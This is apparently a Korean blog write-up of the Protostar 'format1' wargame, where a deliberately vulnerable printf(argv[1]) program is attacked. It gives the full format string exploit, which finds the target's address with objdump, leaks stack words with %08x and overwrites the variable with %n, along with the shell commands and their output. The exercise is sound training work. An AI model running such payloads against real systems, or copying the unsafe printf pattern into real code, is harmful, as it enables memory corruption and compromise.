---
layout: post
title: "[exploit-exercise][protostar] format1"
date: 2016-09-16 08:10:00
category: wargame
tags:  [exploit-exercise, fsb]
---

exploit-exercise/protostar 의 format string 두번째 문제.
[Protostar Format1 - Exploit Exercises](https://exploit-exercises.com/protostar/format1/)

- `objdump -t` is your friend, and your input string lies far up the stack :)

<!--more--> 

## Code 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

전역변수  `int target`을 `printf(argv[1])`의 format string  취약점을 이용하여 변조하는 문제다.

## Understand

`objdump -d` 만 주로 사용해왔었는데 hint 에 `objdump -t` 를 쓰라고 나와서 `objdump` 옵션 확인해보자.

```
$ objdump
Usage: objdump <option(s)> <file(s)>
 Display information from object <file(s)>.
 At least one of the following switches must be given:
  -a, --archive-headers    Display archive header information
  -f, --file-headers       Display the contents of the overall file header
  -p, --private-headers    Display object format specific file header contents
  -h, --[section-]headers  Display the contents of the section headers
  -x, --all-headers        Display the contents of all headers
  -d, --disassemble        Display assembler contents of executable sections
  -D, --disassemble-all    Display assembler contents of all sections
  -S, --source             Intermix source code with disassembly
  -s, --full-contents      Display the full contents of all sections requested
  -g, --debugging          Display debug information in object file
  -e, --debugging-tags     Display debug information using ctags style
  -G, --stabs              Display (in raw form) any STABS info in the file
  -W[lLiaprmfFsoR] or
  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=str,=loc,=Ranges]
                           Display DWARF info in the file
  -t, --syms               Display the contents of the symbol table(s)
  -T, --dynamic-syms       Display the contents of the dynamic symbol table
  -r, --reloc              Display the relocation entries in the file
  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
  @<file>                  Read options from <file>
  -v, --version            Display this program's version number
  -i, --info               List object formats and architectures supported
  -H, --help               Display this information  
```

문제에서 변경해야하는 전역변수 `int target` 의 위치를 확인.

```
$ objdump -t ./format1 |grep target
08049638 g     O .bss   00000004              target  
```

### Stack dump: leak memory

FSB 이용하기 위하여 입력으로 넣어준 format string 과 이를 참조하는 stack 주소를 확인해서 입력으로 넣은 `AAAA` 가 그대로 찍히는 주소 확인. 

```bash
$ ./format1 $(python -c 'print "AAAA" + ".%08x"*130')
AAAA.0804960c.bffffa78.08048469.b7fd8304.b7fd7ff4.bffffa78.08048435.bffffc30.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffaf8.b7eadc76.00000002.bffffb24.bffffb30.b7fe1848.bffffae0.ffffffff.b7ffeff4.0804824d.00000001.bffffae0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffaf8.8380cbc8.a9cdbdd8.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffb24.08048450.08048440.b7ff1040.bffffb1c.b7fff8f8.00000002.bffffc26.bffffc30.00000000.bffffebf.bffffedf.bffffee9.bffffefd.bfffff13.bfffff23.bfffff36.bfffff43.bfffff4e.bfffff8c.bfffff9d.bfffffab.bfffffc2.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.1f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffc0b.0000001f.bffffff2.0000000f.bffffc1b.00000000.00000000.21000000.e5fdab38.fd5bbe3a.979382ce.6960e122.00363836.00000000.2f2e0000.6d726f66.00317461.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
```

### (read) 공격주소와 format string 맞도록 조정
 
 공격하기위한 주소(`08049638`)와 이를 위한 format string (`,%08x`) 정확하게 맞춤.

```bash
$ ./format1 $(python -c 'print "AAAA" + "\x38\x96\x04\x08" + "BBB" + ".%08x"*126 + ",%08x"')
AAAABBB.0804960c.bffffa78.08048469.b7fd8304.b7fd7ff4.bffffa78.08048435.bffffc38.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffaf8.b7eadc76.00000002.bffffb24.bffffb30.b7fe1848.bffffae0.ffffffff.b7ffeff4.0804824d.00000001.bffffae0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffaf8.c6cf9353.ec82e543.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffb24.08048450.08048440.b7ff1040.bffffb1c.b7fff8f8.00000002.bffffc2e.bffffc38.00000000.bffffebf.bffffedf.bffffee9.bffffefd.bfffff13.bfffff23.bfffff36.bfffff43.bfffff4e.bfffff8c.bfffff9d.bfffffab.bfffffc2.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.1f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffc0b.0000001f.bffffff2.0000000f.bffffc1b.00000000.00000000.03000000.490c8c64.ee161c9d.252b64a3.6952a987.00363836.00000000.00000000.00000000.2f2e0000.6d726f66.00317461.41414141,08049638
```

### (write) `%n` 이용하여 메모리 변조

 공격하기위한 주소(`08049638`)와 이를 위한 format string (`%n`)을 통하여 값 write 공격

```bash
$ ./format1 $(python -c 'print "AAAA" + "\x38\x96\x04\x08" + "BBB" + ".%08x"*126 + ",%08n"')
AAAABBB.0804960c.bffffa78.08048469.b7fd8304.b7fd7ff4.bffffa78.08048435.bffffc38.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffaf8.b7eadc76.00000002.bffffb24.bffffb30.b7fe1848.bffffae0.ffffffff.b7ffeff4.0804824d.00000001.bffffae0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffaf8.159a42b7.3fd734a7.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffb24.08048450.08048440.b7ff1040.bffffb1c.b7fff8f8.00000002.bffffc2e.bffffc38.00000000.bffffebf.bffffedf.bffffee9.bffffefd.bfffff13.bfffff23.bfffff36.bfffff43.bfffff4e.bfffff8c.bfffff9d.bfffffab.bfffffc2.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.1f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffc0b.0000001f.bffffff2.0000000f.bffffc1b.00000000.00000000.a5000000.a1d30492.1ae47537.a5cf09eb.69594120.00363836.00000000.00000000.00000000.2f2e0000.6d726f66.00317461.41414141,you have modified the target :)  
```

## Exploit



```bash
$ ./format1 $(python -c 'print "AAAA" + "\x38\x96\x04\x08" + "BBB" + ".%08x"*126 + ",%08n"')
AAAABBB.0804960c.bffffa78.08048469.b7fd8304.b7fd7ff4.bffffa78.08048435.bffffc38.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffaf8.b7eadc76.00000002.bffffb24.bffffb30.b7fe1848.bffffae0.ffffffff.b7ffeff4.0804824d.00000001.bffffae0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffaf8.159a42b7.3fd734a7.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffb24.08048450.08048440.b7ff1040.bffffb1c.b7fff8f8.00000002.bffffc2e.bffffc38.00000000.bffffebf.bffffedf.bffffee9.bffffefd.bfffff13.bfffff23.bfffff36.bfffff43.bfffff4e.bfffff8c.bfffff9d.bfffffab.bfffffc2.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.1f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffc0b.0000001f.bffffff2.0000000f.bffffc1b.00000000.00000000.a5000000.a1d30492.1ae47537.a5cf09eb.69594120.00363836.00000000.00000000.00000000.2f2e0000.6d726f66.00317461.41414141,you have modified the target :)  
```


